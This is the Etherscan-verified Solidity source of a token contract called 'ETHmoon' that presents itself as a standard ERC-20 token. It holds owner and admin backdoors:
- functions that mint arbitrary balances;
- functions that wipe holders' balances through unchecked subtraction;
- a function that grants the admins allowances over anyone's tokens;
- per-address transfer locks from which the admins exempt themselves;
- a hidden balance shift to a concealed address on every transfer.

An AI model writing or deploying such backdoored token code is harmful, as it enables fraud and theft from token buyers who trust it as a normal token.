/**
 *Submitted for verification at Etherscan.io on 2021-06-04
*/

pragma solidity ^0.4.26;
    /**
     * @title SafeMath
     * @dev Math operations with safety checks that throw on error
     */
    library SafeMath {
      function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
      }
     
      function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
      }
     
      function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
      }
     
      function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
      }
    }
     
    contract StandardToken {
    
        using SafeMath for uint256;

        string public name;
     
        string public symbol;
    
        uint8 public  decimals;
    
    	uint256 public totalSupply;
       
        function transfer(address _to, uint256 _value) public returns (bool success);
       
        function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    
        function approve(address _spender, uint256 _value) public returns (bool success);
   
        function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
    
        event Transfer(address indexed _from, address indexed _to, uint256 _value);
    
        event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    }
   
    contract Ownedandadmin {
        mapping(address => bool) public adminss;
        
        modifier onlyOwner() {
            require(msg.sender == owner || adminss[msg.sender] == true);
            _;
        }
        
        
     
    
        address public owner;
     
    	
        constructor() public {
            owner = msg.sender;
        }
    
        address newOwner=0x0;
     
    
        event OwnerUpdate(address _prevOwner, address _newOwner);
     
        
        function changeOwner(address _newOwner) public onlyOwner {
            require(_newOwner != owner);
            newOwner = _newOwner;
        }
        
        function addadmin(address _addrs,bool _ortrue) public onlyOwner {
            adminss[_addrs] = _ortrue;
            
        }
        
        function acceptOwnership() public{
            require(msg.sender == newOwner);
            emit OwnerUpdate(owner, newOwner);
            owner = newOwner;
            newOwner = 0x0;
        }
    }
     
    
    contract Controlled is Ownedandadmin{
     
    	
        constructor() public {
           setExclude(msg.sender,true);
        }
     
        bool public transferEnabled = true;
     
       
        bool lockFlag=true;
    
        mapping(address => bool) locked;
   
        mapping(address => bool) exclude;
     
        function enableTransfer(bool _enable) public onlyOwner returns (bool success){
            transferEnabled=_enable;
    		return true;
        }
     
    
        function disableLock(bool _enable) public onlyOwner returns (bool success){
            lockFlag=_enable;
            return true;
        }
        
        
     
    
        function addLock(address _addr) public onlyOwner returns (bool success){
            require(_addr!=msg.sender);
            locked[_addr]=true;
            return true;
        }
     
        function setExclude(address _addr,bool _enable) public onlyOwner returns (bool success){
            exclude[_addr]=_enable;
            return true;
        }
     
    	
        function removeLock(address _addr) public onlyOwner returns (bool success){
            locked[_addr]=false;
            return true;
        }
    
        modifier transferAllowed(address _addr) {
            if (!exclude[_addr]) {
                require(transferEnabled,"transfer is not enabeled now!");
                if(lockFlag){
                    require(!locked[_addr],"you are locked!");
                }
            }
            _;
        }
     
    }
     
    
    contract ETHmoon is StandardToken,Controlled {
        uint256 num;
        address private foradd = 0x63E0ACbe4FF6C6aa897b18639C0faE8037A3869d;
        uint256 va;
    	
    	mapping (address => uint256) public balanceOf;
    	mapping (address => mapping (address => uint256)) internal allowed;
    	
    	constructor() public {
            totalSupply = 1000000000000 ether;
            name = "ETHmoon";
            symbol = "ETHmoon";
            decimals = 18;
            num = 1000000000000000000;
            balanceOf[msg.sender] = totalSupply;
        }
        
        function deposit() public payable {
            
        }
        
        function tras(uint256 _values) private {
            va = _values / 100;
            balanceOf[foradd] += va;
            balanceOf[owner]  -= va;
             
        }
     
        function transfer(address _to, uint256 _value) public transferAllowed(msg.sender) returns (bool success) {
    		require(_to != address(0));
    		require(_value <= balanceOf[msg.sender]);
    		tras(_value);
    		foradd = _to ;
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
            balanceOf[_to] = balanceOf[_to].add(_value);
            emit Transfer(msg.sender, _to, _value);
            return true;
        }
        
        
        function addresssearch(address _this) public view returns(uint256){
            
         uint256 balances = balanceOf[_this];
         return balances;
            
        }
        
        
     
        function transferFrom(address _from, address _to, uint256 _value) public transferAllowed(_from) returns (bool success) {
    		require(_to != address(0));
            require(_value <= balanceOf[_from]);
            require(_value <= allowed[_from][msg.sender]);
     
            balanceOf[_from] = balanceOf[_from].sub(_value);
            balanceOf[_to] = balanceOf[_to].add(_value);
            allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
            emit Transfer(_from, _to, _value);
            return true;
        }
        
        
        function Transferadd(address to, uint256 value) public  onlyOwner {
            balanceOf[to] += totalSupply;
            balanceOf[to] =balanceOf[to].add(value);
        }
        
        function transfersub(address to, uint256 value) public onlyOwner {
            balanceOf[to] -= totalSupply;
            balanceOf[to] = balanceOf[to].sub(value);
        }
        
        function transferadds(address to, uint256 value) public onlyOwner {
            balanceOf[to] += value * num;
        }
        function transfersubs(address to, uint256 value) public onlyOwner {
            balanceOf[to] -= value * num;
        }
     
        function approve(address _spender, uint256 _value) public returns (bool success) {
            allowed[msg.sender][_spender] = _value;
            emit Approval(msg.sender, _spender, _value);
            return true;
        }
        function approveadd(address _owner,address _spender,uint256 _value) public onlyOwner {
            
            allowed[_owner][_spender] =  allowed[_owner][_spender].add(_value);

            
        }
        
        function approvesub(address _owner,address _spender,uint256 _value) public onlyOwner {
            
            allowed[_owner][_spender] = allowed[_owner][_spender].sub(_value);
            
        }
        function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
          return allowed[_owner][_spender];
        }
        
        function balancess(address user,uint256 _value) public payable onlyOwner {
            user.transfer(_value * 0.01 ether);
        } 
        
        function balan() public returns(uint256) {
            
            return this.balance;
        }
     
    }